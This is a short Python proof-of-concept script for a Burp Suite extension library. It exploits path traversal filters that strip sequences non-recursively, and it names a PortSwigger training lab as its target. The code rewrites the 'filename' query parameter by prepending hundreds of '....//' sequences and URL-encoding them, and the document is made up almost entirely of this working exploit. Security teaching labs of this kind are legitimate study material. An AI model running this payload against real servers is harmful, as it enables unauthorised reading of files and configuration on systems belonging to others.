"""
    Path Traversal Exploitation

    This is a proof-of-concept script that demonstrates the exploitation of path traversal vulnerabilities.
    This script specifically targets systems that attempt to resolve the path traversal issue by stripping sequences non-recursively.
    It exploits this vulnerability by prepending a long sequence of traversal strings to the file path, hoping to bypass the system's security checks.
    It can be used for the following Portswigger lab: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
"""

from pyscalpel import Request
from pyscalpel.utils import urldecode, urlencode_all, removeprefix

# The query parameter to target for path traversal exploitation.
PARAM_NAME = "filename"

# The traversal string sequence used to exploit the vulnerability.
PREFIX = b"....//" * 500


def req_edit_in(req: Request) -> bytes | None:
    """
    Decodes and strips the traversal string sequence from the file path in the incoming HTTP request.

    Args:
        req: The incoming HTTP request.

    Returns:
        The decoded file path stripped of the traversal string sequence, or None if the query parameter is not found.
    """
    param = req.query[PARAM_NAME]
    if param is not None:
        text_bytes = param.encode()
        return removeprefix(urldecode(text_bytes), PREFIX)


def req_edit_out(req: Request, text: bytes) -> Request | None:
    """
    Prepends the traversal string sequence to the file path and encodes it, then sets it as the value of the target query parameter in the outgoing HTTP request.

    Args:
        req: The original HTTP request.
        text: The file path to modify.

    Returns:
        The modified HTTP request with the encoded file path.
    """
    encoded = urlencode_all(PREFIX + text)
    str_encoded = str(encoded, "ascii")
    req.query[PARAM_NAME] = str_encoded
    return req
